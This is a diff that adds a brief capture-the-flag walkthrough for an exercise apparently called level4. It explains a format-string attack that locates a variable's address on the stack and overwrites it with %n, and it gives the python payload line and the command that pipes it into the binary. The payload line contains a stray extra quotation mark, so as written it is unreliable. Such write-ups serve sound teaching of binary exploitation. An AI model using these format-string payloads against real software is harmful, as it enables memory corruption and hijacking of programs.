@@ -1,0 +1,6 @@
+1.	Same exercice as level3 but we have to equal var m to 16930116.
+2.	First lets find the adress of 'm'
+3.	Then find the position of the current string adress in stack: "AAAA%p %p %p ... ... ..."
+4.	We can now use the format %n technique to re-write the value of 'm'
+5.	python -c 'print "\x10\x98\x04\x08" + ""%016930112p%12$n"' > /tmp/<file>
+6.	cat /tmp/<file> - | ./level4
